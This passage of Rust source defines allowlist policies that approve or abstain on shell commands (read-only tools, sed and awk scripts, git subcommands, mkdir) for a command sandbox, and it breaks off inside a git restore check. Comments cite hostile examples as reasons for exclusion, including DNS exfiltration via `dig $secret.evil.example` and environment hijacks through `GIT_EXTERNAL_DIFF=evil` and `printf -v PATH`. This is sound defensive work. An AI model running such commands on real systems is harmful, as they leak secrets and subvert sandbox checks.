// Adapted from amenocturne/da (MIT), src/policies.rs
//! Built-in policies. Each capability is one [`Policy`] value with one
//! verify fn. Atomic: nothing subsumes anything else; users compose by
//! listing the capabilities they want.
//!
//! A rule policy approves a segment only when it recognises both the binary
//! and its arguments. Anything it cannot account for — an unknown flag
//! shape, a word whose value is only known at run time where a flag could
//! matter — makes it abstain.
//!
//! External callers can define their own [`Policy`] values and mix them
//! with the built-ins.
//!
//! [`Policy`]: crate::policy::Policy

use std::path::Path;

use crate::engine::{argv0_name, is_env_assignment};
use crate::model::Segment;
use crate::policy::{Policy, PolicyVerdict as Verdict};

/// Convenience slice listing every built-in rule policy. Useful for the
/// kitchen-sink case in tests, or as a starting point for trimming.
pub const ALL_BUILTIN: &[&Policy] = &[
    &READ_ONLY,
    &MACOS_ONLY,
    &HELP_BYPASS,
    &MKDIR_CWD,
    &GIT_READ,
    &GIT_ADD,
    &GIT_COMMIT,
    &GIT_RESTORE_STAGED,
    &GIT_TAG,
    &GIT_FETCH,
    &GIT_PULL,
    &GIT_PUSH,
    &CARGO_LOCAL,
    &CARGO_CRATES_INSTALL,
    &CARGO_CRATES_PUBLISH,
];

// ─── argument helpers ───────────────────────────────────────────────────────

/// `-abc` → `abc`. `None` for `-`, `--long`, and non-flags.
fn short_cluster(t: &str) -> Option<&str> {
    if t.len() > 1 && t.starts_with('-') && !t.starts_with("--") {
        Some(&t[1..])
    } else {
        None
    }
}

/// Whether `t` is `--name`, `--name=value`, or an abbreviation of it
/// (`getopt_long` and git accept unambiguous prefixes such as `--outp`).
fn long_is(t: &str, name: &str) -> bool {
    let Some(rest) = t.strip_prefix("--") else {
        return false;
    };
    let given = rest.split('=').next().unwrap_or("");
    !given.is_empty() && name.starts_with(given)
}

/// Flags that make an otherwise read-only binary write, execute, or log.
struct Unsafe {
    /// Letters that reject when they appear anywhere in a `-xyz` cluster.
    short: &'static str,
    /// Long option names (matched with abbreviations).
    long: &'static [&'static str],
    /// Whole tokens, for tools with single-dash long options.
    exact: &'static [&'static str],
    /// The tool honours `--`: words after it are operands, so run-time
    /// values are acceptable there.
    end_of_options: bool,
}

/// No unsafe flag, and no run-time word anywhere it could become one.
fn flags_safe(seg: &Segment, rule: &Unsafe) -> bool {
    for (i, t) in seg.argv.iter().enumerate().skip(1) {
        if seg.is_dynamic(i) {
            return false;
        }
        if t == "--" {
            if rule.end_of_options {
                return true;
            }
            continue;
        }
        if rule.exact.contains(&t.as_str()) || rule.long.iter().any(|l| long_is(t, l)) {
            return false;
        }
        if let Some(cluster) = short_cluster(t)
            && cluster.chars().any(|c| rule.short.contains(c))
        {
            return false;
        }
    }
    true
}

/// Number of non-flag words. `value_flags` consume the following word.
fn operand_count(argv: &[String], value_flags: &[&str]) -> usize {
    let mut n = 0;
    let mut i = 1;
    let mut operands_only = false;
    while i < argv.len() {
        let t = argv[i].as_str();
        if operands_only {
            n += 1;
        } else if t == "--" {
            operands_only = true;
        } else if value_flags.contains(&t) {
            i += 1;
        } else if !t.starts_with('-') || t == "-" {
            n += 1;
        }
        i += 1;
    }
    n
}

// ─── read-only ──────────────────────────────────────────────────────────────

/// Cross-platform read-only binaries. Binaries that can write, execute or
/// log through some flag or operand are approved only in forms checked to
/// do none of that. macOS-specific extras live under [`MACOS_ONLY`].
pub static READ_ONLY: Policy = Policy {
    name: "read-only",
    verify: read_only_verify,
};

/// Binaries with no flag or operand that writes a file or runs a program:
/// any argument list is read-only.
const READ_ONLY_PURE: &[&str] = &[
    // File discovery & listing
    "ls",
    "exa",
    "eza",
    "locate",
    // File info & checksums
    "stat",
    "wc",
    "du",
    "df",
    "md5",
    "md5sum",
    "shasum",
    "sha256sum",
    "sha1sum",
    "sha512sum",
    "b2sum",
    "cksum",
    "sum",
    // File reading
    "cat",
    "head",
    "tail",
    // Compressed file viewing
    "zcat",
    "bzcat",
    "xzcat",
    "zipinfo",
    // Search
    "grep",
    "egrep",
    "fgrep",
    // Text processing
    "cut",
    "tr",
    "rev",
    "tac",
    "nl",
    "column",
    "paste",
    "fold",
    "expand",
    "unexpand",
    "fmt",
    "join",
    "col",
    "colrm",
    "tsort",
    // Comparison
    "diff",
    "diff3",
    "comm",
    "cmp",
    // JSON
    "jq",
    // Path utilities
    "dirname",
    "basename",
    "realpath",
    "readlink",
    "pwd",
    // System info
    "cal",
    "uname",
    "whoami",
    "id",
    "uptime",
    "nproc",
    "getconf",
    "locale",
    "groups",
    "who",
    "w",
    "last",
    "logname",
    "users",
    // Process inspection
    "ps",
    "pgrep",
    // `top`, `htop`, `watch` are interactive and would hang the PTY (M3).
    "lsof",
    "vmstat",
    "iostat",
    "free",
    // Network diagnostics: only `netstat`, which reads local tables. dig,
    // nslookup, host, ping, traceroute, tracepath and mtr are not here (I3):
    // the sandbox shares the network, so they are an exfiltration channel
    // (`dig $secret.evil.example`). Divergence from da.
    "netstat",
    // Binary inspection. `ldd` is not here (I4): glibc's ldd can run the
    // inspected binary's loader. Divergence from da.
    "nm",
    "objdump",
    "readelf",
    "size",
    "strings",
    // Tool lookup
    "which",
    "whereis",
    "where",
    "type",
    "apropos",
    "whatis",
    "help",
    // Output / control
    "echo",
    "printf",
    "true",
    "false",
    "test",
    "[",
    // Environment
    "printenv",
    // Media / document metadata
    // `identify` (ImageMagick delegates), `ffprobe` and `mediainfo` (follow
    // URLs / playlists in attacker files) and `soxi` (sox opens `|cmd` and
    // URLs) are not here (I4). Divergence from da.
    "pdfinfo",
    // Terminal
    "clear",
    "tput",
    "tty",
    "reset",
    // Misc
    "seq",
    "expr",
    "od",
    "hexdump",
    "sleep",
];

const FIND_DANGEROUS: &[&str] = &[
    "-exec", "-execdir", "-delete", "-ok", "-okdir", "-fprint", "-fprint0", "-fprintf", "-fls",
];

fn read_only_verify(seg: &Segment, _path: Option<&Path>) -> Option<Verdict> {
    if seg.argv.is_empty() || seg.is_dynamic(0) {
        return None;
    }
    let bin = argv0_name(&seg.argv[0]);
    if bin == "printf" && !printf_assigns_nothing(seg) {
        return None;
    }
    if READ_ONLY_PURE.contains(&bin) || read_only_checked(bin, seg) {
        Some(Verdict::Approve)
    } else {
        None
    }
}

/// Deliberate divergence from da: `printf -v NAME` assigns a shell variable
/// (`printf -v PATH /x; ls`, `printf -v TMPDIR /etc`), which would defeat the
/// engine's environment checks. Abstain when any word before `--` is a `-v…`
/// flag (including glued `-vX`), or when the first word (where bash looks for
/// options) is only known at run time.
fn printf_assigns_nothing(seg: &Segment) -> bool {
    if seg.is_dynamic(1) {
        return false;
    }
    for (i, w) in seg.argv.iter().enumerate().skip(1) {
        if w == "--" && !seg.is_dynamic(i) {
            break;
        }
        if w.starts_with("-v") {
            return false;
        }
    }
    true
}

/// Binaries on the read-only list that need their arguments inspected.
/// Returns `false` for unknown binaries.
fn read_only_checked(bin: &str, seg: &Segment) -> bool {
    let argv = &seg.argv;
    let flags = |short, long, exact, end_of_options| {
        flags_safe(
            seg,
            &Unsafe {
                short,
                long,
                exact,
                end_of_options,
            },
        )
    };
    match bin {
        // -o FILE; -R re-runs tree writing 00Tree.html into each directory
        "tree" => flags("oR", &["output"], &[], false),
        "fd" => flags("xX", &["exec", "exec-batch"], &[], true),
        // -C compiles a magic file
        "file" => flags("C", &["compile"], &[], false),
        "base64" => flags("o", &["output"], &[], false),
        // M3: `less`/`more`/`zless`/…, `man` and `info` page through a TTY
        // pager and would hang the PTY until the command timeout; they are
        // not approved (divergence from da). Likewise `top`, `htop`, `watch`,
        // `bc`/`dc`.
        "bat" => {
            flags(
                "",
                &["pager", "generate-config-file", "diagnostic"],
                &[],
                true,
            ) && argv.get(1).map(String::as_str) != Some("cache")
        }
        "zstdcat" => flags("o", &["output", "rm"], &[], false),
        "rg" => flags("", &["pre", "hostname-bin"], &[], true),
        "ag" => flags("", &["pager"], &[], true),
        "ack" => flags("", &["pager", "output"], &[], true),
        "sort" => flags("o", &["output", "compress-program"], &[], true),
        // second operand is the output file
        "uniq" => !seg.has_dynamic() && operand_count(argv, &["-f", "-s", "-w"]) <= 1,
        "awk" | "gawk" | "mawk" | "nawk" => awk_safe(seg),
        "sed" => sed_safe(seg),
        "find" => !seg.has_dynamic() && !argv.iter().any(|t| FIND_DANGEROUS.contains(&t.as_str())),
        // in-place edit, split into files
        "yq" | "xq" => flags(
            "is",
            &["inplace", "in-place", "split-exp", "split-exp-file"],
            &[],
            false,
        ),
        "xmllint" => {
            flags(
                "",
                &[],
                &["-o", "-output", "--output", "-shell", "--shell"],
                false,
            ) && xmllint_offline(seg)
        }
        "date" => date_safe(seg),
        // `arch -x86_64 cmd` runs cmd
        "arch" => argv.len() == 1,
        "hostname" => argv
            .iter()
            .skip(1)
            .all(|t| HOSTNAME_READ_FLAGS.contains(&t.as_str())),
        "sysctl" => sysctl_safe(seg),
        // -K kills sockets, -D dumps to a file
        "ss" => flags("KD", &["kill", "diag"], &[], false),
        "dwarfdump" => {
            !seg.has_dynamic()
                && !argv
                    .iter()
                    .skip(1)
                    .any(|t| t.starts_with("-o") || t.starts_with("--o"))
        }
        // `hash -p PATH NAME` remaps a later command
        "hash" => flags("pd", &[], &[], false),
        "command" => command_lookup(seg),
        // Divergence from da: `tldr` is not read-only here. On a cache miss
        // it downloads pages from the network.
        // I4: `ffprobe`, `mediainfo` and `identify` are not approved (they
        // follow URLs/delegates named by attacker-controlled files).
        // second operand is the output file
        "xxd" => !seg.has_dynamic() && operand_count(argv, XXD_VALUE_FLAGS) <= 1,
        "cloc" => cloc_safe(seg),
        "set" => set_safe(seg),
        "env" => env_print(seg),
        _ => false,
    }
}

const HOSTNAME_READ_FLAGS: &[&str] = &[
    "-f",
    "-s",
    "-i",
    "-I",
    "-d",
    "-A",
    "-a",
    "-y",
    "--fqdn",
    "--long",
    "--short",
    "--ip-address",
    "--all-ip-addresses",
    "--domain",
    "--all-fqdns",
    "--alias",
    "--yp",
    "--nis",
];

const XXD_VALUE_FLAGS: &[&str] = &[
    "-c",
    "-cols",
    "-g",
    "-groupsize",
    "-l",
    "-len",
    "-o",
    "-offset",
    "-s",
    "-seek",
    "-skip",
    "-n",
    "-name",
];

/// `awk [-F fs] [-v var=val] 'program' [file…]` where the program neither
/// runs commands nor writes: no `system`, no `getline`, no indirect call,
/// and nothing after the first `print` that could be a `>` redirect or a
/// `|` pipe. Program files (`-f`) and gawk extensions are not inspected,
/// so they are not approved.
fn awk_safe(seg: &Segment) -> bool {
    if seg.has_dynamic() {
        return false;
    }
    let argv = &seg.argv;
    let mut i = 1;
    while i < argv.len() {
        let t = argv[i].as_str();
        if t == "--" {
            i += 1;
            break;
        }
        if t == "-F" || t == "-v" {
            i += 2;
        } else if t.starts_with("-F") || t.starts_with("-v") {
            i += 1;
        } else if t.len() > 1 && t.starts_with('-') {
            return false;
        } else {
            break;
        }
    }
    argv.get(i).is_some_and(|p| awk_program_safe(p))
}

fn awk_program_safe(p: &str) -> bool {
    if p.contains("system") || p.contains("getline") || p.contains('@') {
        return false;
    }
    let Some(start) = p.find("print") else {
        return true;
    };
    let tail = &p.as_bytes()[start..];
    for (k, &b) in tail.iter().enumerate() {
        if b == b'>' {
            return false;
        }
        let doubled = (k > 0 && tail[k - 1] == b'|') || tail.get(k + 1) == Some(&b'|');
        if b == b'|' && !doubled {
            return false;
        }
    }
    true
}

/// `sed` without in-place editing or a script file, whose script uses only
/// commands known not to write or execute (see [`sed_script_safe`]).
fn sed_safe(seg: &Segment) -> bool {
    if seg.has_dynamic() {
        return false;
    }
    let argv = &seg.argv;
    let mut scripts: Vec<&str> = Vec::new();
    let mut explicit = false;
    let mut first_operand: Option<&str> = None;
    let mut operands_only = false;
    let mut i = 1;
    while i < argv.len() {
        let t = argv[i].as_str();
        i += 1;
        if operands_only || !t.starts_with('-') || t == "-" {
            first_operand.get_or_insert(t);
            continue;
        }
        if t == "--" {
            operands_only = true;
            continue;
        }
        if let Some(long) = t.strip_prefix("--") {
            match long {
                "quiet" | "silent" | "regexp-extended" | "posix" | "debug" | "separate"
                | "unbuffered" | "null-data" | "sandbox" => {}
                "expression" => {
                    let Some(script) = argv.get(i) else {
                        return false;
                    };
                    scripts.push(script);
                    explicit = true;
                    i += 1;
                }
                _ => match long.strip_prefix("expression=") {
                    Some(script) => {
                        scripts.push(script);
                        explicit = true;
                    }
                    None => return false,
                },
            }
            continue;
        }
        let cluster = &t[1..];
        for (k, ch) in cluster.char_indices() {
            match ch {
                'n' | 'E' | 'r' | 's' | 'u' | 'z' => {}
                'e' => {
                    let attached = &cluster[k + 1..];
                    if attached.is_empty() {
                        let Some(script) = argv.get(i) else {
                            return false;
                        };
                        scripts.push(script);
                        i += 1;
                    } else {
                        scripts.push(attached);
                    }
                    explicit = true;
                    break;
                }
                // -i edits in place, -f reads a script we cannot see
                _ => return false,
            }
        }
    }
    if !explicit {
        let Some(script) = first_operand else {
            return false;
        };
        scripts.push(script);
    }
    scripts.iter().all(|s| sed_script_safe(s))
}

/// A small sed-script parser that accepts only addresses plus the commands
/// `{ } = d D g G h H l n N p P q Q x z`, `s` (flags `g p i I m M` and
/// digits) and `y`. Everything else — `w`/`W` (write a file), `e`
/// (execute), the `w` and `e` flags of `s`, `r`, `a`/`i`/`c`, branches —
/// is rejected, as is anything that does not parse.
fn sed_script_safe(script: &str) -> bool {
    let b = script.as_bytes();
    let mut i = 0;
    let blank = |c: u8| c == b' ' || c == b'\t';
    loop {
        while i < b.len() && (blank(b[i]) || b[i] == b'\n' || b[i] == b';') {
            i += 1;
        }
        if i >= b.len() {
            return true;
        }
        if b[i] == b'#' {
            while i < b.len() && b[i] != b'\n' {
                i += 1;
            }
            continue;
        }
        if !sed_skip_address(b, &mut i) {
            return false;
        }
        while i < b.len() && blank(b[i]) {
            i += 1;
        }
        if i < b.len() && b[i] == b',' {
            i += 1;
            while i < b.len() && blank(b[i]) {
                i += 1;
            }
            let before = i;
            if !sed_skip_address(b, &mut i) || i == before {
                return false;
            }
        }
        while i < b.len() && (blank(b[i]) || b[i] == b'!') {
            i += 1;
        }
        let Some(&cmd) = b.get(i) else { return false };
        i += 1;
        match cmd {
            b'{' | b'}' | b'=' | b'd' | b'D' | b'g' | b'G' | b'h' | b'H' | b'n' | b'N' | b'p'
            | b'P' | b'x' | b'z' => {}
            b'l' | b'q' | b'Q' => {
                while i < b.len() && (blank(b[i]) || b[i].is_ascii_digit()) {
                    i += 1;
                }
            }
            b's' | b'y' => {
                let Some(&delim) = b.get(i) else { return false };
                if delim == b'\n' || delim == b'\\' {
                    return false;
                }
                i += 1;
                if !sed_skip_delimited(b, &mut i, delim) || !sed_skip_delimited(b, &mut i, delim) {
                    return false;
                }
                if cmd == b's' {
                    while i < b.len()
                        && (matches!(b[i], b'g' | b'p' | b'i' | b'I' | b'm' | b'M')
                            || b[i].is_ascii_digit())
                    {
                        i += 1;
                    }
                }
            }
            _ => return false,
        }
        // A command must be followed by a separator, a closing brace, or
        // the end of the script — not by text we have not looked at.
        if cmd != b'{' && i < b.len() && !(blank(b[i]) || matches!(b[i], b';' | b'\n' | b'}')) {
            return false;
        }
    }
}

/// Skip one optional sed address. Returns `false` when it is malformed.
fn sed_skip_address(b: &[u8], i: &mut usize) -> bool {
    let digits = |i: &mut usize| {
        while *i < b.len() && b[*i].is_ascii_digit() {
            *i += 1;
        }
    };
    match b.get(*i) {
        Some(c) if c.is_ascii_digit() => {
            digits(i);
            if b.get(*i) == Some(&b'~') {
                *i += 1;
                digits(i);
            }
            true
        }
        Some(b'$') => {
            *i += 1;
            true
        }
        Some(b'+') | Some(b'~') => {
            *i += 1;
            digits(i);
            true
        }
        Some(b'/') => {
            *i += 1;
            sed_skip_regex_tail(b, i, b'/')
        }
        Some(b'\\') => {
            let Some(&delim) = b.get(*i + 1) else {
                return false;
            };
            *i += 2;
            sed_skip_regex_tail(b, i, delim)
        }
        _ => true,
    }
}

fn sed_skip_regex_tail(b: &[u8], i: &mut usize, delim: u8) -> bool {
    if !sed_skip_delimited(b, i, delim) {
        return false;
    }
    while *i < b.len() && matches!(b[*i], b'I' | b'M') {
        *i += 1;
    }
    true
}

/// Advance past the next unescaped `delim`. `false` if there is none.
fn sed_skip_delimited(b: &[u8], i: &mut usize, delim: u8) -> bool {
    while *i < b.len() {
        match b[*i] {
            b'\\' => *i += 2,
            c if c == delim => {
                *i += 1;
                return true;
            }
            _ => *i += 1,
        }
    }
    false
}

/// `date` that only prints: no `-s`/`--set`, and no bare operand (which on
/// BSD sets the clock) unless `-j` says "don't set".
fn date_safe(seg: &Segment) -> bool {
    if seg.has_dynamic() {
        return false;
    }
    let argv = &seg.argv;
    let mut dont_set = false;
    let mut bare_operand = false;
    let mut i = 1;
    while i < argv.len() {
        let t = argv[i].as_str();
        i += 1;
        if let Some(long) = t.strip_prefix("--") {
            if long_is(t, "set") {
                return false;
            }
            if matches!(long, "date" | "reference" | "file" | "rfc-3339") {
                i += 1;
            }
        } else if let Some(cluster) = short_cluster(t) {
            for (k, ch) in cluster.char_indices() {
                match ch {
                    'j' => dont_set = true,
                    'n' | 'R' | 'u' => {}
                    'I' => break,
                    'd' | 'r' | 'v' | 'f' | 'z' => {
                        if cluster[k + 1..].is_empty() {
                            i += 1;
                        }
                        break;
                    }
                    _ => return false,
                }
            }
        } else if !t.starts_with('+') {
            bare_operand = true;
        }
    }
    !bare_operand || dont_set
}

/// `sysctl` that only reads: no `name=value`, no `-w`, no loading of
/// settings files.
fn sysctl_safe(seg: &Segment) -> bool {
    if seg.has_dynamic() {
        return false;
    }
    seg.argv.iter().skip(1).all(|t| {
        if t.contains('=') {
            return false;
        }
        if t.starts_with("--") {
            return matches!(
                t.as_str(),
                "--all" | "--names" | "--values" | "--version" | "--help"
            );
        }
        match short_cluster(t) {
            Some(cluster) => !cluster.chars().any(|c| "wpf".contains(c)),
            None => true,
        }
    })
}

/// `command -v NAME` / `command -V NAME` — lookup only. (`command NAME …`
/// runs NAME; the engine classifies that form itself.)
fn command_lookup(seg: &Segment) -> bool {
    if seg.has_dynamic() {
        return false;
    }
    match seg.argv.get(1).and_then(|t| short_cluster(t)) {
        Some(cluster) => cluster.chars().all(|c| "pvV".contains(c)) && cluster.contains(['v', 'V']),
        None => false,
    }
}

/// Divergence from da: `xmllint` options that make it fetch a DTD or
/// XInclude target (possibly a URL named by the file) defer unless `--nonet`
/// is also given. `--nonet` is matched exactly: an abbreviation could be
/// `--noent`, which does not stop network access.
fn xmllint_offline(seg: &Segment) -> bool {
    const FETCHING: &[&str] = &[
        "valid",
        "loaddtd",
        "dtdvalid",
        "xinclude",
        "dtdattr",
        "postvalid",
    ];
    let args = || seg.argv.iter().skip(1);
    let fetches = args().any(|t| FETCHING.iter().any(|f| long_is(t, f)));
    !fetches || args().any(|t| t == "--nonet")
}

/// `env` with no command: prints the environment.
fn env_print(seg: &Segment) -> bool {
    seg.argv.iter().skip(1).all(|t| {
        matches!(
            t.as_str(),
            "-" | "-i" | "--ignore-environment" | "-0" | "--null"
        ) || is_env_assignment(t)
    })
}

/// `set -e`, `set -euo pipefail`, `set +x`: shell option toggles only.
/// `set -- …` rewrites the positional parameters and is not approved.
/// Deliberate divergence from da: `set` is approved only for a known-safe
/// option allowlist. `set -k` (`-o keyword`) makes bash treat later
/// `NAME=value` arguments as environment assignments, which would bypass the
/// risky-env screen (`set -k; git diff GIT_EXTERNAL_DIFF=evil`).
fn set_safe(seg: &Segment) -> bool {
    const SHORT: &str = "euxvfCnBao";
    const NAMES: &[&str] = &[
        "errexit",
        "nounset",
        "xtrace",
        "verbose",
        "noglob",
        "noclobber",
        "pipefail",
        "allexport",
        "braceexpand",
    ];
    if seg.has_dynamic() {
        return false;
    }
    let argv = &seg.argv;
    let mut i = 1;
    while i < argv.len() {
        let t = argv[i].as_str();
        let Some(letters) = t.strip_prefix('-').or_else(|| t.strip_prefix('+')) else {
            return false;
        };
        // `o` takes the following option name, so it must end the cluster.
        let takes_name = letters.ends_with('o');
        let body = letters.strip_suffix('o').unwrap_or(letters);
        if letters.is_empty() || !body.chars().all(|c| SHORT.contains(c) && c != 'o') {
            return false;
        }
        i += 1;
        if takes_name
            && let Some(name) = argv.get(i)
            && NAMES.contains(&name.as_str())
        {
            i += 1;
        }
    }
    true
}

const CLOC_FLAGS: &[&str] = &[
    "--by-file",
    "--by-file-by-lang",
    "--by-percent",
    "--json",
    "--yaml",
    "--csv",
    "--md",
    "--xml",
    "--quiet",
    "--git",
    "--vcs",
    "--exclude-dir",
    "--exclude-ext",
    "--exclude-lang",
    "--include-lang",
    "--include-ext",
    "--match-f",
    "--match-d",
    "--not-match-f",
    "--not-match-d",
    "--fullpath",
    "--hide-rate",
    "--follow-links",
    "--skip-uniqueness",
    "--show-lang",
    "--show-ext",
    "--version",
    "--help",
    "-v",
];

/// `cloc` has many report/strip options that write files and one that runs
/// a program, so only a known list of counting and filtering options is
/// approved.
fn cloc_safe(seg: &Segment) -> bool {
    if seg.has_dynamic() {
        return false;
    }
    seg.argv
        .iter()
        .skip(1)
        .all(|t| !t.starts_with('-') || CLOC_FLAGS.contains(&t.split('=').next().unwrap_or(t)))
}

// ─── macos-only ─────────────────────────────────────────────────────────────

/// macOS-specific read-only extras. No-op on non-macOS hosts (the binaries
/// just don't exist) — but kept opt-in to stay explicit.
pub static MACOS_ONLY: Policy = Policy {
    name: "macos-only",
    verify: macos_only_verify,
};

const MACOS_ONLY_BINS: &[&str] = &[
    "mdfind",
    "mdls",
    "sw_vers",
    "system_profiler",
    "hostinfo",
    "vm_stat",
    "pbpaste",
    "otool",
    "dyld_info",
];

fn macos_only_verify(seg: &Segment, _path: Option<&Path>) -> Option<Verdict> {
    if seg.argv.is_empty() || seg.is_dynamic(0) {
        return None;
    }
    let bin = argv0_name(&seg.argv[0]);
    if !MACOS_ONLY_BINS.contains(&bin) {
        return None;
    }
    // `mdls -plist FILE` writes FILE.
    if bin == "mdls" && (seg.has_dynamic() || seg.argv.iter().any(|t| t == "-plist")) {
        return None;
    }
    Some(Verdict::Approve)
}

// ─── help-bypass ────────────────────────────────────────────────────────────

/// `<binary> --help|-h|--version|-V|help|version` for *any* binary, even
/// ones that aren't otherwise approved. Lets unknown binaries run, even if
/// just for help — explicit trust call.
pub static HELP_BYPASS: Policy = Policy {
    name: "help-bypass",
    verify: help_bypass_verify,
};

fn help_bypass_verify(seg: &Segment, _path: Option<&Path>) -> Option<Verdict> {
    // C1: a path-qualified binary is not vouched for, even for --help.
    if seg.argv.len() == 2
        && !seg.has_dynamic()
        && !seg.argv[0].contains('/')
        && is_help_flag(&seg.argv[1])
    {
        Some(Verdict::Approve)
    } else {
        None
    }
}

fn is_help_flag(s: &str) -> bool {
    matches!(s, "--help" | "-h" | "--version" | "-V" | "help" | "version")
}

// ─── mkdir-cwd ──────────────────────────────────────────────────────────────

/// `mkdir` when every path argument resolves under the `--path` directory.
/// Requires the engine caller to pass a path (otherwise only relative paths
/// without `..` traversal are accepted).
pub static MKDIR_CWD: Policy = Policy {
    name: "mkdir-cwd",
    verify: mkdir_cwd_verify,
};

fn mkdir_cwd_verify(seg: &Segment, path: Option<&Path>) -> Option<Verdict> {
    // Run-time words (`$DIR`, `{a,/etc/b}`) can resolve anywhere.
    if seg.argv.is_empty() || seg.has_dynamic() || argv0_name(&seg.argv[0]) != "mkdir" {
        return None;
    }
    let cwd_str = path.and_then(|p| p.to_str());
    let mut i = 1;
    let mut has_path = false;
    while i < seg.argv.len() {
        let t = &seg.argv[i];
        if t == "-m" || t == "--mode" {
            i += 2;
            continue;
        }
        if t.starts_with('-') {
            i += 1;
            continue;
        }
        if !is_subdir_of_cwd(t, cwd_str) {
            return None;
        }
        has_path = true;
        i += 1;
    }
    if has_path {
        Some(Verdict::Approve)
    } else {
        None
    }
}

fn is_subdir_of_cwd(path: &str, cwd: Option<&str>) -> bool {
    // argv strings are quote-decoded; literal $ or leading ~ here means the
    // user wrote them quoted (so they're meant literally) — reject as odd.
    if path.is_empty() || path.contains('$') || path.starts_with('~') {
        return false;
    }
    let cwd_str = match cwd {
        Some(c) if c.starts_with('/') => c,
        _ => {
            return !path.starts_with('/') && !path.split('/').any(|s| s == "..");
        }
    };
    let mut stack: Vec<&str> = if path.starts_with('/') {
        Vec::new()
    } else {
        cwd_str.split('/').filter(|s| !s.is_empty()).collect()
    };
    for seg in path.split('/') {
        if seg.is_empty() || seg == "." {
            continue;
        }
        if seg == ".." {
            if stack.pop().is_none() {
                return false;
            }
            continue;
        }
        stack.push(seg);
    }
    let cwd_stack: Vec<&str> = cwd_str.split('/').filter(|s| !s.is_empty()).collect();
    if stack.len() < cwd_stack.len() {
        return false;
    }
    cwd_stack.iter().zip(stack.iter()).all(|(a, b)| a == b)
}

// ─── git:* family ───────────────────────────────────────────────────────────

const GIT_READ_SUBCOMMANDS: &[&str] = &[
    "status",
    "log",
    "diff",
    "show",
    "branch",
    "blame",
    "ls-files",
    "ls-tree",
    "rev-parse",
    "rev-list",
    "describe",
    "reflog",
    "shortlog",
    "config",
    "grep",
    "cat-file",
    "merge-base",
];
const GIT_COMMIT_DANGEROUS: &[&str] = &["--amend", "--no-verify", "--no-gpg-sign"];

/// git inspection: status, log, diff, show, branch (listing forms), blame,
/// ls-files, ls-tree, rev-parse, rev-list, describe, reflog (not
/// expire/delete), shortlog, config (reading forms). `--output=FILE` and
/// `--ext-diff` are rejected everywhere.
pub static GIT_READ: Policy = Policy {
    name: "git:read",
    verify: git_read_verify,
};

fn git_read_verify(seg: &Segment, _path: Option<&Path>) -> Option<Verdict> {
    let (sub, args) = git_parts(seg)?;
    if !GIT_READ_SUBCOMMANDS.contains(&sub) {
        return None;
    }
    if args
        .iter()
        .any(|t| long_is(t, "output") || long_is(t, "ext-diff"))
    {
        return None;
    }
    let ok = match sub {
        "branch" => git_branch_lists(args),
        "config" => git_config_reads(args),
        // `-O<cmd>` / `--open-files-in-pager=<cmd>` runs a command.
        // `--textconv` / `--filters` run configured converter commands.
        "cat-file" => !args
            .iter()
            .any(|t| long_is(t, "textconv") || long_is(t, "filters")),
        "grep" => !args.iter().any(|t| {
            long_is(t, "open-files-in-pager")
                || t.starts_with('-') && !t.starts_with("--") && t.contains('O')
        }),
        "reflog" => !matches!(
            args.iter()
                .find(|t| !t.starts_with('-'))
                .map(String::as_str),
            Some("expire" | "delete" | "drop")
        ),
        _ => true,
    };
    if ok { Some(Verdict::Approve) } else { None }
}

/// `git branch` in a listing form. A bare name (`git branch new`) creates a
/// branch, so operands are accepted only in list mode; any option outside
/// the listing set (`-d`, `-m`, `-f`, `-u`, `--edit-description`, …) is
/// rejected.
fn git_branch_lists(args: &[String]) -> bool {
    let mut list_mode = false;
    let mut operands = 0;
    let mut i = 0;
    while i < args.len() {
        let t = args[i].as_str();
        i += 1;
        match t {
            "--all" | "--remotes" | "--verbose" | "--show-current" | "--no-color" | "--color"
            | "--column" | "--no-column" | "--no-abbrev" | "--ignore-case" | "--omit-empty" => {}
            "--list" => list_mode = true,
            "--merged" | "--no-merged" | "--contains" | "--no-contains" => {
                list_mode = true;
                if args.get(i).is_some_and(|n| !n.starts_with('-')) {
                    i += 1;
                }
            }
            "--points-at" => {
                list_mode = true;
                i += 1;
            }
            "--sort" | "--format" => i += 1,
            _ if ["--color=", "--column=", "--abbrev=", "--sort=", "--format="]
                .iter()
                .any(|p| t.starts_with(p)) => {}
            _ if [
                "--merged=",
                "--no-merged=",
                "--contains=",
                "--no-contains=",
                "--points-at=",
            ]
            .iter()
            .any(|p| t.starts_with(p)) =>
            {
                list_mode = true
            }
            _ => match short_cluster(t) {
                Some(cluster) if cluster.chars().all(|c| "arvli".contains(c)) => {
                    list_mode |= cluster.contains('l');
                }
                Some(_) => return false,
                None if t.starts_with('-') => return false,
                None => operands += 1,
            },
        }
    }
    operands == 0 || list_mode
}

/// `git config` in a reading form: an explicit `--get*`/`--list`, the
/// `get`/`list` subcommands, or a single key.
fn git_config_reads(args: &[String]) -> bool {
    let mut reads = false;
    let mut operands: Vec<&str> = Vec::new();
    let mut i = 0;
    while i < args.len() {
        let t = args[i].as_str();
        i += 1;
        match t {
            "--get" | "--get-all" | "--get-regexp" | "--get-urlmatch" | "--get-color"
            | "--get-colorbool" | "-l" | "--list" => reads = true,
            "--local" | "--global" | "--system" | "--worktree" | "-z" | "--null"
            | "--name-only" | "--show-origin" | "--show-scope" | "--bool" | "--int"
            | "--bool-or-int" | "--path" | "--includes" | "--no-includes" | "--all"
            | "--regexp" | "--show-names" => {}
            "-f" | "--file" | "--blob" | "--type" | "--default" | "--url" => i += 1,
            _ if ["--file=", "--blob=", "--type=", "--default=", "--url="]
                .iter()
                .any(|p| t.starts_with(p)) => {}
            _ if t.starts_with('-') => return false,
            _ => operands.push(t),
        }
    }
    if reads {
        return true;
    }
    match operands.as_slice() {
        ["get", ..] | ["list"] => true,
        [key] => key.contains('.'),
        _ => false,
    }
}

/// `git add` — staging.
pub static GIT_ADD: Policy = Policy {
    name: "git:add",
    verify: git_match_add,
};

/// `git commit` — excludes `--amend`, `--no-verify`, `--no-gpg-sign`.
pub static GIT_COMMIT: Policy = Policy {
    name: "git:commit",
    verify: git_commit_verify,
};

fn git_commit_verify(seg: &Segment, _path: Option<&Path>) -> Option<Verdict> {
    let (sub, args) = git_parts(seg)?;
    if sub != "commit" {
        return None;
    }
    if args
        .iter()
        .any(|t| GIT_COMMIT_DANGEROUS.contains(&t.as_str()))
    {
        return None;
    }
    Some(Verdict::Approve)
}

/// `git restore --staged` (or `-S`) — unstage. `git restore` against the
/// working tree is destructive and isn't covered by any built-in.
pub static GIT_RESTORE_STAGED: Policy = Policy {
    name: "git:restore-staged",
    verify: git_restore_staged_verify,
};

fn git_restore_staged_verify(seg: &Segment, _path: Option<&Path>) -> Option<Verdict> {
